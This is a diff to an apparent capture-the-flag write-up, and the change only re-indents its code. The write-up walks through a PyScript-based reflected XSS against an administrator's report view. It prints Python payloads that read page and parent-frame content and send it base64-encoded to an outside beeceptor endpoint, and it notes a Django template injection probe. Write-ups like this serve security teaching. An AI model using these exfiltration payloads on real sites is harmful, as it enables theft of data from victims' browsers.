@@ -4,24 +4,24 @@
 
 - The pyscript functionality allows us to get a reflected XSS with the following payload that we report to the admin:
   ```python
-    import base64
-    from js import fetch
-    fetch('https://endpoint.free.beeceptor.com?a='+base64.b64encode(bytes('test', encoding='UTF-8')).decode())
+  import base64
+  from js import fetch
+  fetch('https://endpoint.free.beeceptor.com?a='+base64.b64encode(bytes('test', encoding='UTF-8')).decode())
   ```
 - From this XSS, it is possible to execute javascript on the administrator's browser.
 - It is not possible to retrieve the administrator's cookies as they are ``HTTP only``.
 - It is possible to retrieve the content of the HTML page with :
   ```python
-    import base64
-    from js import fetch, document
-    fetch('https://endpoint.free.beeceptor.com?a='+base64.b64encode(bytes(document.getElementsByTagName('body')[0].innerText, encoding='UTF-8')).decode())
+  import base64
+  from js import fetch, document
+  fetch('https://endpoint.free.beeceptor.com?a='+base64.b64encode(bytes(document.getElementsByTagName('body')[0].innerText, encoding='UTF-8')).decode())
   ```
 - Nothing interesting is found because the administrator's report functionality allows him to view the python code through an iframe
 - To retrieve the HTML content of the page that contains the iframe :
   ```python
-    import base64
-    from js import fetch, parent
-    fetch('https://endpoint.free.beeceptor.com?a='+base64.b64encode(bytes(parent.document.getElementsByTagName('body')[0].innerText, encoding='UTF-8')).decode())
+  import base64
+  from js import fetch, parent
+  fetch('https://endpoint.free.beeceptor.com?a='+base64.b64encode(bytes(parent.document.getElementsByTagName('body')[0].innerText, encoding='UTF-8')).decode())
   ```
 - We then find our username and the message we sent in the report
 - It is possible to exploit a DTL SSTI vulnerability through the message sent: ``{{ "test" }}``
